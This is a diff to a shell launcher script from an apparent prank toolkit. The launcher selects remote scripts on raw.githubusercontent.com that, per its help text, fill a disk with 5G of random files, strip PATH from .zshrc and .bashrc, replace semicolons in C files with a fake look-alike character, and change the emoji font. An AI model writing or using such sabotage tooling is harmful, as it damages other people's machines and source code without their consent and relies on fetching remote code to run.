@@ -3,19 +3,24 @@
 scriptlocation=""
 argument=""
 
+githubloc="https://raw.githubusercontent.com/Poul0s/42-troll/master"
+
 case "$1" in
 	--help)
-		printf "TODO LATER \nArguments : \n--help : show help\n-F | --full-disk : add 5G of random files everywhere\n-P | --where-are-commands : remove PATH from .zshrc and .bashrc\n-S | --replace-semicolon : replace all semcolon by a fake semicolon of file passed in arg 2 (tip : ~/**/*.c for all .c )"
+		printf "TODO LATER \nArguments : \n\n--help : show help\n\n-F | --full-disk : add 5G of random files everywhere\n\n-P | --where-are-commands : remove PATH from .zshrc and .bashrc\n\n-S | --replace-semicolon : replace all semcolon by a fake semicolon of file passed in arg 2 (tip : ~/**/*.c for all .c )\n\n-E | --emoji-font : set emoji font\n"
 	;;
 	--full-disk|-F)
-		scriptlocation="https://raw.githubusercontent.com/Poul0s/42-troll/master/full_disk.sh"
+		scriptlocation="$githubloc/full_disk.sh"
 	;;
 	--where-are-commands|-P)
-		scriptlocation="https://raw.githubusercontent.com/Poul0s/42-troll/master/where_are_commands.sh"
+		scriptlocation="$githubloc/where_are_commands.sh"
 	;;
 	--replace-semicolon|-S)
-		scriptlocation="https://raw.githubusercontent.com/Poul0s/42-troll/master/fake-semicolon.sh"
+		scriptlocation="$githubloc/fake-semicolon.sh"
 		argument=$2
+	;;
+	--emoji-font|-E)
+		scriptlocation="$githubloc/emoji_font.sh"
 	;;
 	*)
 		echo "arg '$1' invalid"
